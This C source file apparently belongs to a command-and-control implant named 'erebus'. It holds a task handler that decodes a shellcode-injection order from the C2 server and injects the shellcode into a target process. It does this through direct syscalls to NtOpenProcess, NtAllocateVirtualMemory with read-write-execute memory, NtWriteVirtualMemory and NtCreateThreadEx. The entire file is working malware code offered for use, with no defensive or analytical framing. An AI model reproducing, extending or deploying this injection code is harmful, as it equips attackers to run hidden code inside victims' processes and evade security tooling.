#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/pb_c2.h"
#include "erebus/syscall.h"
#include "erebus/task_handlers.h"

#define MEM_COMMIT_RESERVE 0x3000
#define PAGE_EXEC_RW       0x40
#define PROCESS_INJECT_ACCESS 0x001F0FFF

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    UNICODE_STRING *ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES;

static void init_oa(OBJECT_ATTRIBUTES *oa) {
    memset(oa, 0, sizeof(*oa));
    oa->Length = sizeof(*oa);
}

static int inject_remote_thread(uint32_t pid, const uint8_t *sc, size_t sc_len, uint32_t *tid_out) {
    if (!erebus_syscall_init()) return 0;

    HANDLE hproc = NULL;
    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid, NULL };
    OBJECT_ATTRIBUTES oa;
    init_oa(&oa);

    if (erebus_NtOpenProcess(&hproc, PROCESS_INJECT_ACCESS, &oa, &cid) < 0)
        return 0;

    PVOID base = NULL;
    SIZE_T region = sc_len;
    if (erebus_NtAllocateVirtualMemory(hproc, &base, 0, &region, MEM_COMMIT_RESERVE, PAGE_EXEC_RW) < 0) {
        CloseHandle(hproc);
        return 0;
    }

    SIZE_T written = 0;
    if (erebus_NtWriteVirtualMemory(hproc, base, (PVOID)sc, sc_len, &written) < 0 || written != sc_len) {
        CloseHandle(hproc);
        return 0;
    }

    HANDLE hthread = NULL;
    if (erebus_NtCreateThreadEx(&hthread, 0x1FFFFF, NULL, hproc, base, NULL, 0, 0, 0, 0, NULL) < 0) {
        CloseHandle(hproc);
        return 0;
    }

    if (tid_out) {
        DWORD tid = GetThreadId(hthread);
        *tid_out = tid;
    }
    CloseHandle(hthread);
    CloseHandle(hproc);
    return 1;
}

int erebus_task_inject(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    erebus_inject_task task;
    if (!erebus_pb_decode_inject_task(data, data_len, &task) || !task.shellcode || !task.target_pid) {
        erebus_pb_free_inject_task(&task);
        return 0;
    }

    if (task.method[0] && strcmp(task.method, "createremotethread") != 0 && strcmp(task.method, "apcqueue") != 0) {
        erebus_pb_free_inject_task(&task);
        return 0;
    }

    uint32_t tid = 0;
    int ok = inject_remote_thread(task.target_pid, task.shellcode, task.shellcode_len, &tid);
    int enc = erebus_pb_encode_inject_result(ok, task.target_pid, tid, out, out_len);
    erebus_pb_free_inject_task(&task);
    return enc;
}